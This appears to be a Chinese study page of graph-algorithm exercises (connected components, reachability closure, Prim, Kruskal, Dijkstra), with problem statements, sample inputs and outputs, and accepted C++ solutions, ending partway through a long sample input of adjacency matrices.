DS图—图的连通分量\n\n题目:\n\n```\n输入无向图顶点信息和边信息，创建图的邻接矩阵存储结构，计算图的连通分量个数。\n\n输入\n测试次数t\n每组测试数据格式如下：\n第一行：顶点数 顶点信息\n第二行：边数\n第三行开始，每行一条边信息\n\n输出\n每组测试数据输出，顶点信息和邻接矩阵信息\n输出图的连通分量个数，具体输出格式见样例。\n每组输出直接用空行分隔。\n```\n\n样例：\n\n```\n3\n4 A B C D\n2\nA B\nA C\n6 V1 V2 V3 V4 V5 V6\n5\nV1 V2\nV1 V3\nV2 V4\nV5 V6\nV3 V5\n8 1 2 3 4 5 6 7 8\n5\n1 2\n1 3\n5 6\n5 7\n4 8\n```\n\n样例输出：\n\n```\nA B C D\n0 1 1 0\n1 0 0 0\n1 0 0 0\n0 0 0 0\n2\n\nV1 V2 V3 V4 V5 V6\n0 1 1 0 0 0\n1 0 0 1 0 0\n1 0 0 0 1 0\n0 1 0 0 0 0\n0 0 1 0 0 1\n0 0 0 0 1 0\n1\n\n1 2 3 4 5 6 7 8\n0 1 1 0 0 0 0 0\n1 0 0 0 0 0 0 0\n1 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 1\n0 0 0 0 0 1 1 0\n0 0 0 0 1 0 0 0\n0 0 0 0 1 0 0 0\n0 0 0 1 0 0 0 0\n3\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<map>\n#include<cstring>\nusing namespace std;\n\n#define maxn 501\n#define maxm 5001\n\nint g[maxn][maxm];\nbool vis[maxn];\nstring node[maxn];\nmap<string, int>mp;\n\nvoid init()\n{\n\tmemset(g, 0, sizeof g);\n\tmemset(vis, 0, sizeof vis);\n\tmp.clear();\n}\n\nvoid dfs(int pos, int n)\n{\n\tif (vis[pos])return;\n\tvis[pos] = 1;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tif (!vis[i] && g[pos][i])dfs(i, n);\n\t}\n}\n\nint calparts(int n)\n{\n\tmemset(vis, 0, sizeof vis);\n\tint ans = 0;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tif (!vis[i])\n\t\t{\n\t\t\tdfs(i, n), ans++;\n\t\t}\n\t}\n\treturn ans;\n}\n\nint main()\n{\n\tint t, n, m;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tinit();\n\t\tcin >> n;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tcin >> node[i];\n\t\t\tmp[node[i]] = i;\n\t\t}\n\t\tcin >> m;\n\t\tfor (int i = 0; i < m; i++)\n\t\t{\n\t\t\tstring from, to;\n\t\t\tcin >> from >> to;\n\t\t\tg[mp[from]][mp[to]] = g[mp[to]][mp[from]] = 1;\n\t\t}\n\t\t\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tif (i == mp.size() - 1)cout << node[i] << endl;\n\t\t\telse cout << node[i] << ' ';\n\t\t}\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tfor (int j = 0; j < n; j++)\n\t\t\t{\n\t\t\t\tif (j == n - 1)cout << g[i][j] << endl;\n\t\t\t\telse cout << g[i][j] << ' ';\n\t\t\t}\n\t\t}\n\t\tcout << calparts(n) << endl << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 图的顶点可达闭包\n\n题目:\n\n```\n给定有向图的邻接矩阵A，其元素定义为：若存在顶点i到顶点j的有向边则A[i,j]=1，若没有有向边则A[i,j]=0。试求A的可达闭包矩阵A*，其元素定义为：若存在顶点i到顶点j的有向路径则A*[i,j]=1，若没有有向路径则A*[i,j]=0。\n\n输入\n第1行顶点个数n\n第2行开始的n行有向图的邻接矩阵，元素之间由空格分开\n\n输出\n有向图的可达闭包矩阵A*，元素之间由空格分开\n```\n\n样例：\n\n```\n4\n0 1 0 1\n0 0 1 0\n0 0 0 0\n0 0 0 0\n```\n\n样例输出：\n\n```\n0 1 1 1\n0 0 1 0\n0 0 0 0\n0 0 0 0\n```\n\nAC代码：\n\n使用Floyd算法\n\n```cpp\n#include<iostream>\n#include<cstring>\nusing namespace std;\n\n#define maxn 500\n\nint g[maxn][maxn];\n\nvoid getgplus(int n)\n{\n\tfor (int k = 0; k < n; k++)\n\t{\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tfor (int j = 0; j < n; j++)\n\t\t\t{\n\t\t\t\tif (!g[i][j] && g[i][k] && g[k][j])g[i][j] = 1;\n\t\t\t}\n\t\t}\n\t}\n}\n\nint main()\n{\n\tint n;\n\tcin >> n;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tfor (int j = 0; j < n; j++)\n\t\t{\n\t\t\tcin >> g[i][j];\n\t\t}\n\t}\n\tgetgplus(n);\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tfor (int j = 0; j < n; j++)\n\t\t{\n\t\t\tif (j == n - 1)cout << g[i][j] << endl;\n\t\t\telse cout << g[i][j] << ' ';\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 村村通工程（Prim算法）\n\n题目:\n\n```\n\"村村通\"是国家一个系统工程，其包涵有：公路、电力、生活和饮用水、电话网、有线电视网、互联网等等。\n村村通公路工程，是国家为构建和谐社会，支持新农村建设的一项重大举措，是一项民心工程。又称“五年千亿元”工程\n该工程是指中国力争在5年时间实现所有村庄通沥青路或水泥路，以打破农村经济发展的交通瓶颈，解决9亿农民的出行难题。\n现有村落间道路的统计数据表中，列出了有可能建设成标准公路的若干条道路的成本，求使每个村落都有公路连通所需要的最低成本。\n要求用Prim算法求解\n\n输入\n第1行：顶点数n\n第2行：n个顶点编号\n第3行：边数m\n接着m行：m条边信息，格式为：顶点1 顶点2 权值\n最后一行：Prim算法的起点v\n\n输出\n第1行：输出最小生成树的权值之和\n接着n-1行对应n-1条边信息\n按树的生长顺序输出\n```\n\n样例：\n\n```\n6\nv1 v2 v3 v4 v5 v6 \n10\nv1 v2 6\nv1 v3 1\nv1 v4 5\nv2 v3 5\nv2 v5 3\nv3 v4 5\nv3 v5 6\nv3 v6 4\nv4 v6 2\nv5 v6 6\nv1\n```\n\n样例输出：\n\n```\n15\nv1 v3 1\nv3 v6 4\nv6 v4 2\nv3 v2 5\nv2 v5 3\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<vector>\n#include<map>\n#include<cstring>\nusing namespace std;\n\n#define inf 0x3f3f3f3f\n\nstruct node\n{\n\tint to, w;\n};\nstruct ans\n{\n\tstring u, v;\n\tint  w;\n};\nvector<node>g[1000];\nbool vis[1000];\nint dis[1000];\nint adj[1000];\nmap<string, int>mp;\nstring name[1000];\nvector<ans>arcs;\n\nvoid prim(int n, int m, int st)\n{\n\tint sum = 0;\n\tmemset(vis, 0, sizeof vis);\n\tvis[st] = 1;\n\tint flag, mindis = inf;\n\tfor (int i = 0; i < n; i++)dis[i] = inf;\n\tfor (auto i : g[st])\n\t{\n\t\tif (i.w < dis[i.to])\n\t\t{\n\t\t\tdis[i.to] = i.w;\n\t\t\tadj[i.to] = st;\n\t\t}\n\t\tif (i.w < mindis)\n\t\t{\n\t\t\tmindis = i.w;\n\t\t}\n\t}\n\n\tfor (int i = 0; i < n - 1; i++)\n\t{\n\t\tmindis = inf;\n\t\tfor (int j = 0; j < n; j++)\n\t\t{\n\t\t\tif (!vis[j] && dis[j] < mindis)\n\t\t\t{\n\t\t\t\tmindis = dis[j];\n\t\t\t\tflag = j;\n\t\t\t}\n\t\t}\n\t\tif (mindis == inf)break;\n\t\tarcs.push_back({ name[adj[flag]] ,name[flag] ,mindis });\n\t\tsum += mindis;\n\t\tvis[flag] = 1;\n\t\tfor (auto i : g[flag])\n\t\t{\n\t\t\tif (!vis[i.to])\n\t\t\t{\n\t\t\t\tif(i.w < dis[i.to])\n\t\t\t\t{\n\t\t\t\t\tdis[i.to] = i.w;\n\t\t\t\t\tadj[i.to] = flag;\n\t\t\t\t}\n\t\t\t\tif (i.w < mindis)\n\t\t\t\t{\n\t\t\t\t\tmindis = i.w;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tif (mindis == inf)\n\t{\n\t\tcout << -1 << endl;\n\t\treturn;\n\t}\n\tcout << sum << endl;\n\tfor (auto i : arcs)\n\t{\n\t\tcout << i.u << ' ' << i.v << ' ' << i.w << endl;\n\t}\n}\n\nint main()\n{\n\tint n, m;\n\tcin >> n;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcin >> name[i];\n\t\tmp[name[i]] = i;\n\t}\n\tcin >> m;\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tstring u, v;\n\t\tint w;\n\t\tcin >> u >> v >> w;\n\t\tg[mp[u]].push_back({ mp[v],w });\n\t\tg[mp[v]].push_back({ mp[u],w });\n\t}\n\tstring st;\n\tcin >> st;\n\tprim(n, m, mp[st]);\n\treturn 0;\n}\n```\n\n\n\n#### 村村通工程（Kruskal算法）\n\n题目与上面一样\n\n样例：\n\n```\n6\nv1 v2 v3 v4 v5 v6 \n10\nv1 v2 6\nv1 v3 1\nv1 v4 5\nv2 v3 5\nv2 v5 3\nv3 v4 5\nv3 v5 6\nv3 v6 4\nv4 v6 2\nv5 v6 6\n```\n\n样例输出：\n\n```\n15\nv1 v3 1\nv4 v6 2\nv2 v5 3\nv3 v6 4\nv2 v3 5\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<vector>\n#include<map>\n#include<cstring>\n#include<algorithm>\nusing namespace std;\n\n#define maxn 10000\n\nstruct node\n{\n\tint u, v, w;\n};\n\nstruct node2\n{\n    string u, v;\n    int w;\n};\n\nvector<node>g;\nvector<node2>ans;\nint fa[maxn];\nstring name[maxn];\nmap<string, int>mp;\n\nbool cmp(node x, node y)\n{\n    return x.w < y.w;\n}\n\nint find(int x)\n{\n    if (x == fa[x]) return x;\n    return fa[x] = find(fa[x]);\n}//并查集\n\nvoid kruskal(int n, int m)\n{\n    int sum = 0;\n    int cnt = 0;\n    for (int i = 0; i < n; i++)fa[i] = i;\n    sort(g.begin(), g.end(), cmp);\n    for (int i = 0; i < m; i++)\n    {\n        node u = g[i];\n        int fu = find(u.u), fv = find(u.v);\n        if (fu == fv)continue;\n        sum += u.w;\n        fa[fv] = fu;\n        ans.push_back({ name[u.u],name[u.v],u.w });\n        if (++cnt == n - 1)break;\n    }\n    if (cnt < n - 1)\n    {\n        cout << -1;\n        return;\n    }\n\n    cout << sum << endl;\n    for (auto i : ans)\n    {\n        cout << i.u << ' ' << i.v << ' ' << i.w << endl;\n    }\n}\n\nint main()\n{\n    int n, m;\n    cin >> n;\n    for (int i = 0; i < n; i++)\n    {\n        cin >> name[i];\n        mp[name[i]] = i;\n    }\n    cin >> m;\n    for (int i = 0; i < m; i++)\n    {\n        string u, v;\n        int w;\n        cin >> u >> v >> w;\n        if (mp[u] > mp[v])swap(u, v);\n        g.push_back({ mp[u],mp[v],w });\n    }\n    kruskal(n, m);\n    return 0;\n}\n```\n\n\n\n#### DS图—图的最短路径（无框架）\n\n题目:\n\n```\n给出一个图的邻接矩阵，输入顶点v，用迪杰斯特拉算法求顶点v到其它顶点的最短路径。\n\n输入\n第一行输入t，表示有t个测试实例\n第二行输入顶点数n和n个顶点信息\n第三行起，每行输入邻接矩阵的一行，以此类推输入n行\n第i个结点与其它结点如果相连则为距离，无连接则为0，数据之间用空格隔开。\n第四行输入一个顶点v，表示求该顶点v到其他顶点的最短路径距离\n以此类推输入下一个示例\n\n输出\n对每组测试数据，输出：\n每行输出顶点v到某个顶点的最短距离和最短路径\n每行格式：顶点v编号-其他顶点编号-最短路径值----[最短路径]。没有路径输出：顶点v编号-其他顶点编号--1。具体请参考示范数据\n```\n\n样例1：\n\n```\n2\n5 0 1 2 3 4\n0 5 0 7 15\n0 0 5 0 0\n0 0 0 0 1\n0 0 2 0 0\n0 0 0 0 0\n0\n6 V0 V1 V2 V3 V4 V5\n0 0 10 0 30 100\n0 0 5 0 0 0\n0 0 0 50 0 0\n0 0 0 0 0 10\n0 0 0 20 0 60\n0 0 0 0 0 0\nV0\n```\n\n样例1输出：\n\n```\n0-1-5----[0 1 ]\n0-2-9----[0 3 2 ]\n0-3-7----[0 3 ]\n0-4-10----[0 3 2 4 ]\nV0-V1--1\nV0-V2-10----[V0 V2 ]\nV0-V3-50----[V0 V4 V3 ]\nV0-V4-30----[V0 V4 ]\nV0-V5-60----[V0 V4 V3 V5 ]\n```\n\n样例2：\n\n```\n14\n24 Hv FM ys uA uf wK sJ Ll Xz Rc dj UP IP sr Nf Jx Mn eA WL ek bb Yq dz oR\n0 0 0 0 0 0 0 0 0 0 0 63 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 39 0 0 0 0 0 0 0 0 0 91 0 0 0 0 0\n0 0 0 0 0 0 0 61 80 48 0 0 0 0 0 32 0 0 0 0 0 0 0 0\n0 15 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 80 0 0 0 62 79 0 40 0 0 0 0 70 0 0 0 0 0 0 0 32\n0 0 0 0 0 0 0 0 0 0 0 0 84 0 0 0 0 0 0 98 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 30 0 0 0 36 0 0 0 81 0 0 0 0\n0 0 0 0 0 0 0 0 0 32 0 0 0 94 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 41 0 0 0\n0 35 0 0 75 0 0 0 0 0 0 91 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 48 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 87 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 100 0 0 0 0 0 0 0 0 0 0 0 0 0 75 19 0 0 0\n0 70 0 0 0 0 59 0 12 0 0 0 0 0 0 19 0 0 0 0 0 0 0 0\n0 90 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 41 0 0 0 0 0 0 0 71 0 0 0 0 0 68 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 72 0 0 0 0 0 0 0 0 0 0 0\n0 0 63 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 85 0 55\n23 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 23 0 0 0 0 0 0 0 0 0 0 68 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 83 0 0 19 0 90 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 17 0 71 0 0 0 0 0 0 0 0 0 0 0 0 0 10 0 0\n40 0 0 0 0 0 0 0 0 0 64 58 0 0 0 0 0 0 0 0 0 0 0 0\nys\n24 NO Kh LZ mu Uw FX Jj Jn NX FD uC fO Kp gY lm yk sS bu HI tB MG yP kv is\n0 0 0 0 0 0 16 0 0 65 65 68 28 0 0 0 0 0 0 50 0 0 0 0\n0 0 95 0 44 0 0 0 99 0 0 0 0 0 0 0 45 38 21 85 0 85 0 0\n0 0 0 43 45 0 38 0 59 0 61 28 10 0 0 0 61 0 0 0 36 0 86 51\n85 0 0 0 93 0 0 16 0 23 33 0 95 0 0 59 0 58 70 0 64 0 0 20\n0 0 0 10 0 12 0 50 75 0 0 0 0 20 82 94 61 24 0 0 47 0 13 64\n0 0 24 99 0 0 18 56 0 0 0 0 0 0 0 10 0 0 0 11 0 0 0 0\n0 0 52 0 0 30 0 0 0 0 0 0 0 51 0 16 0 0 0 0 0 0 0 24\n48 0 0 0 0 90 0 0 96 0 0 0 91 0 18 0 90 0 0 0 46 16 0 0\n0 85 0 0 0 0 12 91 0 0 0 0 90 0 0 0 0 0 42 0 0 0 0 0\n0 0 11 0 0 0 27 86 14 0 0 0 94 0 0 21 84 0 90 24 0 74 0 0\n66 0 0 0 0 0 51 0 0 0 0 0 0 16 0 0 0 0 41 0 0 0 0 0\n0 96 0 61 25 95 0 94 57 0 0 0 0 0 0 0 0 0 0 98 41 0 0 34\n87 86 0 0 0 10 43 0 0 0 0 39 0 0 0 0 29 10 34 0 0 58 0 64\n0 69 0 0 0 0 0 15 0 52 0 58 0 0 12 0 0 60 0 0 0 37 65 0\n75 92 57 0 68 22 0 0 0 96 31 0 0 0 0 0 0 51 0 34 0 0 0 0\n20 0 0 0 66 78 0 62 58 0 0 0 0 0 0 0 0 0 42 0 0 0 0 53\n0 0 51 0 0 0 0 0 0 45 0 57 0 46 0 0 0 39 0 97 87 0 27 0\n0 0 0 0 93 0 0 23 11 0 29 36 37 69 0 0 0 0 0 84 32 0 0 0\n0 38 0 0 0 0 0 47 52 0 0 21 0 0 0 0 66 0 0 62 0 0 17 0\n60 0 98 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 31 0 0 41 55 57\n26 12 0 63 0 0 0 26 77 0 0 34 0 0 27 0 0 80 67 34 0 0 0 0\n0 37 0 0 0 0 26 90 0 51 79 0 37 0 0 0 0 0 10 0 0 0 0 44\n0 0 0 87 0 31 76 45 68 0 0 73 0 0 58 0 0 0 0 0 0 0 0 0\n0 15 93 94 0 0 30 0 0 41 0 0 95 0 0 100 0 0 0 0 0 0 0 0\nHI\n22 xS FA jT uu BH Ze yA Zg zG Bw nO iJ bA ff BN cG lV ZL ah mP TS Jh\n0 0 30 0 0 0 27 0 69 0 0 35 0 0 0 0 0 0 0 0 0 0\n0 0 75 0 0 32 0 0 0 0 88 0 49 52 0 0 0 0 0 0 0 54\n0 0 0 0 0 0 0 0 0 0 25 0 0 0 0 0 0 0 19 88 0 0\n0 0 0 0 0 0 0 0 0 0 0 83 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 74 0 0 0 0 0 0 0\n89 17 0 0 0 0 0 0 0 0 18 0 0 0 0 0 0 0 0 0 73 0\n0 0 98 0 0 0 0 0 48 45 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 21 0 0 0 54 0 76 0 95 70 0 64 0 0\n0 0 0 46 57 0 0 0 0 0 0 0 0 0 0 0 98 0 17 0 0 0\n0 62 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 0 0 0\n0 0 0 0 64 0 0 0 0 41 0 0 0 86 0 0 0 0 0 0 0 54\n0 0 0 54 0 62 0 23 0 0 0 0 0 17 0 0 0 0 0 0 0 0\n0 0 0 32 77 0 0 0 29 35 0 31 0 0 98 0 0 0 0 35 0 27\n39 92 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 90 0 0\n50 0 0 31 0 80 0 0 0 0 0 0 0 0 0 67 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 32 0 0 0 24 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 15 0 29 45 0 0 0 63 0 0 0 0 36 0 0\n0 0 99 0 0 0 0 0 0 0 0 0 0 0 0 56 0 0 47 0 0 33\n0 0 47 0 0 0 0 0 0 0 0 0 0 0 0 0 16 20 0 0 0 0\n0 0 0 15 0 0 14 0 0 0 0 0 0 61 0 0 19 0 71 0 0 0\n0 0 0 0 44 0 78 0 0 0 0 0 0 0 94 0 23 0 70 0 0 0\n0 49 0 44 0 0 88 0 0 0 0 49 24 0 0 100 0 0 0 0 0 0\nyA\n25 Cq em Ay uA eH Tq yd nY Nz nm kl yu SH eR UH YP FB gs MB dO Sb uv aO uf gu\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 35 0 30 0 47 0 71 0 0 0\n0 0 0 0 0 0 60 0 67 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 33 57 0 0 0 0 0 0 0 0 79 0 0 0 0 0 77 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 59 0 31 0 0 23\n44 0 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 40 0 0 0 0\n0 0 0 0 41 0 0 0 0 0 20 0 34 34 51 0 0 0 0 0 0 0 0 0 0\n0 0 88 0 0 0 0 0 0 0 69 0 0 0 0 0 0 0 69 0 0 0 0 62 21\n0 0 0 0 0 0 0 0 98 0 86 0 0 0 0 0 81 32 0 0 0 0 0 0 79\n0 0 0 0 0 0 95 0 0 29 0 15 0 0 0 0 0 0 0 67 0 26 65 0 0\n0 0 0 0 0 0 61 0 0 0 0 0 0 0 36 0 0 0 0 42 0 0 0 85 0\n0 0 0 0 14 0 68 16 0 0 0 0 0 0 0 0 0 0 0 0 0 43 0 0 0\n0 0 0 0 0 0 0 0 0 61 0 0 0 0 44 17 0 13 35 15 0 0 91 0 0\n0 0 10 79 0 96 0 0 0 0 84 0 0 0 0 0 0 0 0 50 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 24 0 59 0 68 0 38 0 0 0 0 0 0 0 12\n0 0 68 0 0 0 0 0 0 0 0 58 0 0 0 33 0 0 24 0 0 0 53 0 40\n0 0 0 0 0 0 0 0 0 89 0 0 89 0 35 0 0 83 0 0 0 0 0 0 0\n37 0 0 0 0 82 0 0 0 0 0 0 0 0 0 0 0 0 20 0 0 0 0 0 0\n0 0 21 0 96 0 0 0 0 0 0 0 36 0 0 0 39 0 0 32 0 0 0 0 0\n72 0 0 0 0 0 0 11 0 0 0 0 32 0 48 0 0 0 0 0 0 99 0 0 0\n0 96 59 0 0 45 0 49 94 0 11 0 72 0 0 0 71 0 0 0 0 0 0 0 0\n0 0 0 0 82 0 0 0 0 0 0 38 0 0 0 0 0 21 0 0 0 0 0 0 0\n0 0 75 0 11 0 0 0 0 35 0 0 0 99 67 80 0 0 35 91 0 0 0 0 0\n13 0 0 0 0 0 0 44 0 0 0 0 0 0 0 26 0 0 0 0 48 22 0 61 0\n67 0 0 0 72 0 0 53 0 0 0 0 0 74 0 0 0 0 0 81 0 0 0 0 0\n0 0 0 0 34 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\nSH\n20 kd di Da Cz Yz Rw Zs jt of nf QP wq tZ AY MW Py ZK TD uJ Ew\n0 0 0 61 0 0 65 0 37 0 40 0 0 0 0 45 66 0 41 0\n0 0 46 81 0 100 80 0 0 0 0 46 30 0 59 0 0 0 12 0\n65 89 0 0 100 0 0 56 0 75 0 94 27 0 34 0 49 18 94 36\n0 0 0 0 0 0 0 32 77 0 58 0 0 0 0 0 0 69 0 44\n0 18 0 43 0 31 77 14 54 0 0 95 0 0 88 0 0 0 17 81\n0 95 44 50 71 0 0 0 36 0 16 41 0 0 37 0 94 0 47 0\n0 26 0 0 0 31 0 81 0 30 91 0 42 0 0 80 0 0 0 15\n0 43 0 0 14 0 0 0 32 58 95 0 79 0 16 0 57 0 32 87\n0 0 55 34 22 79 37 67 0 0 0 67 74 0 77 0 0 0 0 0\n27 76 79 0 0 0 99 74 69 0 0 27 82 0 0 0 49 12 66 60\n45 51 0 11 27 0 0 21 0 35 0 0 0 90 0 0 74 0 61 45\n0 0 52 41 83 0 0 30 0 0 0 0 13 90 51 0 0 99 0 72\n69 94 71 0 29 12 67 0 0 34 0 29 0 0 89 47 56 81 0 0\n59 0 0 0 29 0 0 0 0 20 42 0 64 0 45 0 0 0 17 0\n0 35 0 0 58 0 0 0 0 0 24 0 76 69 0 44 53 61 0 0\n60 0 0 75 39 0 11 49 14 0 60 0 0 0 17 0 11 0 0 55\n0 0 11 0 0 0 79 0 0 0 20 0 0 0 49 64 0 0 91 53\n0 0 58 26 0 0 11 0 0 0 87 0 37 0 26 18 19 0 36 0\n0 78 0 27 72 23 16 0 0 0 30 0 0 0 0 70 95 62 0 36\n0 0 0 53 93 85 0 0 67 0 97 0 29 0 0 59 26 0 83 0\nYz\n22 wm bQ Er OY od xz jN PS eV LF Yr Dk cN cq WV Ew dn uF yd oI Wg Bc\n0 0 0 0 0 0 58 0 0 64 0 0 0 87 0 0 0 0 0 44 0 0\n24 0 0 0 0 0 0 22 0 0 0 92 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 14 61 0 0 0 0 0 88 0 0 0\n0 0 0 0 0 0 0 23 0 0 0 0 0 0 0 0 0 0 22 0 0 0\n0 39 0 0 0 0 0 0 0 0 86 0 0 91 0 0 0 0 99 0 0 0\n0 40 0 0 0 0 0 0 0 0 0 32 0 0 0 0 0 0 91 0 0 0\n0 0 50 0 82 0 0 0 0 0 0 0 77 0 0 20 0 0 0 0 0 0\n73 54 0 0 0 0 0 0 75 0 75 0 0 0 0 30 0 0 34 0 0 0\n0 0 0 0 0 0 71 0 0 0 0 99 0 0 67 0 0 0 0 0 0 46\n0 0 0 0 0 0 0 0 0 0 0 0 54 0 48 0 0 26 0 0 14 0\n0 0 0 0 0 0 0 0 0 34 0 0 78 0 0 65 0 68 0 69 0 0\n0 53 0 0 0 0 0 0 17 0 0 0 0 0 0 0 72 0 0 0 0 0\n0 0 0 33 0 0 93 98 0 78 0 0 0 0 0 0 0 0 59 99 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 34 0 0 0 0 0 0\n0 0 0 81 0 0 0 26 0 55 0 0 0 0 0 0 0 0 0 67 0 0\n0 0 0 0 97 0 0 0 0 0 0 66 0 26 0 0 89 0 0 0 0 0\n48 0 81 0 0 0 0 0 0 0 34 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 59 0 0 0 0 66 0 0 0 0 0 0 0 0 0 16 0 0\n0 73 0 0 0 0 0 0 0 0 28 0 0 0 0 0 40 0 0 0 0 0\n0 0 0 55 0 0 0 74 0 0 0 0 0 0 0 0 0 0 0 0 75 0\n0 18 90 0 0 0 0 35 0 0 0 0 0 0 0 0 0 0 0 61 0 0\n50 0 0 0 0 57 0 0 98 100 0 0 0 0 0 0 0 0 0 0 0 0\nWg\n22 qL kN fx wz Qe bS MP xB Ox AA LY xY ds fC Ge Qg xr kR EM QF oY QQ\n0 0 0 0 96 0 0 0 0 0 0 0 16 0 0 18 64 0 0 75 0 0\n0 0 44 0 0 0 17 0 0 0 11 0 0 0 84 0 0 0 0 0 0 0\n0 95 0 53 100 94 0 31 0 0 66 0 49 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 55 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 72 0 0 0 0 0 19 51 0 0 0 0 0 34 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 92 0 0 15 0 85 0 0\n0 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 27 0 0 0\n84 0 0 20 40 0 0 49 0 0 0 0 0 0 0 0 0 0 14 0 41 25\n0 0 0 0 0 0 26 0 19 0 0 0 0 0 35 58 0 0 0 0 0 0\n0 0 56 0 0 0 0 0 0 0 0 0 0 0 0 0 95 0 0 0 26 0\n88 0 0 0 0 0 0 0 0 0 0 0 97 0 40 0 0 0 0 0 0 0\n26 0 0 0 0 0 0 0 0 0 0 0 0 0 24 0 0 0 0 0 12 0\n0 0 0 0 93 0 0 15 0 0 0 0 0 0 0 0 0 0 0 0 99 0\n0 0 0 0 0 25 0 0 0 0 0 38 0 0 0 0 45 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 12 0 0 0 0 0 0 0 0 0 0 0\n0 95 0 0 0 0 0 88 0 0 0 0 82 0 0 0 0 93 0 0 0 0\n0 0 0 0 0 0 0 44 0 0 0 0 0 0 0 0 88 0 31 87 0 0\n0 0 0 0 0 0 0 0 55 0 56 81 0 0 0 0 0 0 0 0 0 90\n0 0 0 0 0 58 0 0 0 0 0 0 0 0 0 0 0 66 0 0 0 0\n0 0 0 0 49 0 0 93 0 0 0 18 76 0 0 0 0 0 0 0 0 30\n0 0 70 0 0 0 0 0 58 0 0 0 0 0 0 0 0 0 0 0 0 0\nAA\n24 iW OV xm ma pB sA EK qD Aw cn my Kg nP zN zK Nn gu JH sX KJ Od Mm iM wQ\n0 100 0 0 0 0 0 0 52 0 0 0 49 0 0 0 0 0 0 0 0 10 0 0\n0 0 0 0 0 0 0 22 0 0 0 82 0 0 0 0 0 0 94 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 88 0 0 47\n60 0 0 0 75 0 0 0 64 0 0 0 65 0 0 0 0 0 82 0 0 0 0 0\n0 0 0 97 0 0 0 0 0 34 0 0 0 0 0 0 27 0 0 0 0 82 13 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 41 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 32 0 0 0 0 83 0 0 0 0 0 0 0 0\n25 0 0 0 0 0 0 0 0 0 0 0 0 0 47 0 0 0 0 0 52 0 0 0\n0 21 0 0 0 0 0 0 0 0 61 0 0 0 0 0 0 48 0 79 26 0 0 46\n0 0 0 0 25 58 0 0 0 0 0 13 0 0 0 0 47 48 0 0 0 83 82 0\n0 0 0 0 10 0 16 0 32 38 0 0 0 0 0 89 0 0 0 0 57 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 21 0 0 81 54 0 0 0 0\n0 0 29 66 0 0 0 0 14 66 0 0 0 0 0 0 100 0 0 0 0 0 0 0\n0 0 0 0 21 0 0 74 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 70 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 13 0 0 0\n0 0 0 0 0 0 0 0 23 0 0 0 0 0 100 0 0 76 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 68 0 35 0 0 0 0 0 0 0 24 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 